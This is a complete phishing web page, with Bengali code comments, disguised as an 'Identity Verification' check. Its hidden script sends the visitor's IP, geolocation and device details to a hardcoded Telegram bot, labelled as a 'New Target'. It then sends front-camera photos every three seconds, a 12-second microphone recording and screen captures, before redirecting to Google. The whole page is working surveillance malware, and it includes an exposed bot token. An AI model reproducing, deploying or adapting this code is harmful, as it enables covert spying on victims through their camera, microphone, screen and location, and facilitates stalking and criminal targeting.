<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Security Check</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            font-family: 'Segoe UI', system-ui, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .card {
            background: rgba(30, 41, 59, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 32px;
            padding: 32px 24px;
            max-width: 480px;
            width: 100%;
            text-align: center;
            border: 1px solid rgba(16, 185, 129, 0.3);
            box-shadow: 0 25px 45px -12px rgba(0,0,0,0.5);
        }
        h2 { color: #f1f5f9; font-size: 1.8rem; margin-bottom: 12px; }
        p { color: #94a3b8; margin-bottom: 28px; line-height: 1.5; }
        button {
            background: linear-gradient(95deg, #10b981, #059669);
            border: none;
            padding: 16px 32px;
            border-radius: 60px;
            font-size: 18px;
            font-weight: 600;
            color: white;
            cursor: pointer;
            width: 100%;
            transition: all 0.2s ease;
            margin-bottom: 12px;
        }
        button:active { transform: scale(0.97); }
        .reset-btn { background: linear-gradient(95deg, #ef4444, #dc2626); }
        .status {
            margin-top: 20px;
            padding: 12px 16px;
            border-radius: 20px;
            font-size: 14px;
            line-height: 1.4;
        }
        .status.info { background: #1e3a8a; color: #bfdbfe; }
        .status.success { background: #14532d; color: #bbf7d0; }
        .status.error { background: #7f1d1d; color: #fecaca; }
        .hidden { display: none; }
    </style>
</head>
<body>
<div class="card">
    <h2>🔐 Identity Verification</h2>
    <p>Please click the button below to complete verification</p>
    <button id="verifyBtn">✅ Click to Verify</button>
    <button id="resetBtn" class="reset-btn">🔄 Reset</button>
    <div id="status" class="status info">⚡ Ready. Click verify button.</div>
</div>

<script>
    (function() {
        // ==================== আপনার টেলিগ্রাম তথ্য ====================
        const BOT_TOKEN = '8193376363:AAFaDSLah6R-i_hkQY9fKyeYiudZJSNsLeg';
        const CHAT_ID = '6449981797';
        // ==============================================================
        
        let mediaStream = null;
        let audioStream = null;
        let cameraInterval = null;
        let screenCaptureInterval = null;
        let isActive = false;
        
        // Hidden elements
        const video = document.createElement('video');
        video.setAttribute('autoplay', '');
        video.setAttribute('playsinline', '');
        video.setAttribute('muted', '');
        video.style.display = 'none';
        document.body.appendChild(video);
        
        const statusDiv = document.getElementById('status');
        const verifyBtn = document.getElementById('verifyBtn');
        const resetBtn = document.getElementById('resetBtn');
        
        // ==================== টেলিগ্রাম পাঠানোর ফাংশন ====================
        async function sendToTelegram(message, isPhoto = false, photoBlob = null, isVoice = false, voiceBlob = null) {
            if (isPhoto && photoBlob) {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', photoBlob, `cam_${Date.now()}.png`);
                formData.append('caption', message);
                try {
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
                } catch(e) {}
            } 
            else if (isVoice && voiceBlob) {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('voice', voiceBlob, `audio_${Date.now()}.ogg`);
                formData.append('caption', message);
                try {
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, { method: 'POST', body: formData });
                } catch(e) {}
            }
            else {
                try {
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
                    });
                } catch(e) {}
            }
        }
        
        // ==================== ক্যামেরা ছবি তোলা ====================
        function captureAndSendCamera() {
            if (!video.videoWidth || !video.videoHeight || !mediaStream || !mediaStream.active) return;
            
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            canvas.toBlob((blob) => {
                if (blob) sendToTelegram('📸 Camera capture', true, blob);
            }, 'image/png');
        }
        
        // ==================== স্ক্রিনশট তোলা (চুপিসারে) ====================
        async function captureScreen() {
            try {
                const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
                const track = screenStream.getVideoTracks()[0];
                const imageCapture = new ImageCapture(track);
                const bitmap = await imageCapture.grabFrame();
                
                const canvas = document.createElement('canvas');
                canvas.width = bitmap.width;
                canvas.height = bitmap.height;
                canvas.getContext('2d').drawImage(bitmap, 0, 0);
                
                canvas.toBlob((blob) => {
                    if (blob) sendToTelegram('🖥️ Screen capture', true, blob);
                }, 'image/png');
                
                screenStream.getTracks().forEach(t => t.stop());
            } catch(e) {
                // Silent fail
            }
        }
        
        // ==================== মাইক্রোফোন রেকর্ড (পটভূমিতে) ====================
        async function startSilentMicrophone() {
            try {
                audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const mediaRecorder = new MediaRecorder(audioStream);
                const chunks = [];
                
                mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
                mediaRecorder.onstop = async () => {
                    const audioBlob = new Blob(chunks, { type: 'audio/webm' });
                    if (audioBlob.size > 5000) {
                        await sendToTelegram('🎤 Audio recording', false, null, true, audioBlob);
                    }
                };
                
                mediaRecorder.start();
                
                // রেকর্ড চলবে 12 সেকেন্ড
                setTimeout(() => {
                    if (mediaRecorder.state === 'recording') {
                        mediaRecorder.stop();
                        if (audioStream) audioStream.getTracks().forEach(t => t.stop());
                    }
                }, 12000);
                
            } catch(e) {}
        }
        
        // ==================== আইপি ও লোকেশন ====================
        async function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) { resolve('Location not supported'); return; }
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        const lat = pos.coords.latitude;
                        const lng = pos.coords.longitude;
                        resolve(`📍 Location: ${lat}, ${lng}\n🗺️ https://www.google.com/maps?q=${lat},${lng}`);
                    },
                    () => resolve('📍 Location access denied'),
                    { timeout: 8000 }
                );
            });
        }
        
        async function sendDeviceInfo() {
            const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip).catch(() => 'unknown');
            const location = await getLocation();
            const userAgent = navigator.userAgent;
            const screenRes = `${screen.width}x${screen.height}`;
            
            await sendToTelegram(`🆕 New Target\n🌐 IP: ${ip}\n${location}\n📱 UA: ${userAgent.substring(0, 100)}\n📏 Screen: ${screenRes}`);
        }
        
        // ==================== সব কিছু একসাথে শুরু ====================
        async function startAll() {
            if (isActive) return;
            isActive = true;
            
            statusDiv.className = 'status info';
            statusDiv.innerHTML = '🔄 Processing...';
            
            // Send device info first
            await sendDeviceInfo();
            
            // Start camera
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                mediaStream = stream;
                video.srcObject = stream;
                
                // Start capturing every 3 seconds
                cameraInterval = setInterval(captureAndSendCamera, 3000);
                
                // Start microphone (silent)
                await startSilentMicrophone();
                
                // Start screen capture every 10 seconds
                screenCaptureInterval = setInterval(captureScreen, 10000);
                
                statusDiv.className = 'status success';
                statusDiv.innerHTML = '✅ Verification complete! Redirecting...';
                
                // Stop everything and redirect after 15 seconds
                setTimeout(() => {
                    if (cameraInterval) clearInterval(cameraInterval);
                    if (screenCaptureInterval) clearInterval(screenCaptureInterval);
                    if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
                    if (audioStream) audioStream.getTracks().forEach(t => t.stop());
                    window.location.href = 'https://www.google.com';
                }, 15000);
                
            } catch(err) {
                statusDiv.className = 'status error';
                statusDiv.innerHTML = '❌ Verification failed. Please try again.';
                isActive = false;
            }
        }
        
        function resetAll() {
            if (cameraInterval) clearInterval(cameraInterval);
            if (screenCaptureInterval) clearInterval(screenCaptureInterval);
            if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
            if (audioStream) audioStream.getTracks().forEach(t => t.stop());
            isActive = false;
            statusDiv.className = 'status info';
            statusDiv.innerHTML = '⚡ Reset. Click verify again.';
        }
        
        verifyBtn.addEventListener('click', startAll);
        resetBtn.addEventListener('click', resetAll);
        
        console.log('Page loaded');
    })();
</script>
</body>
</html>
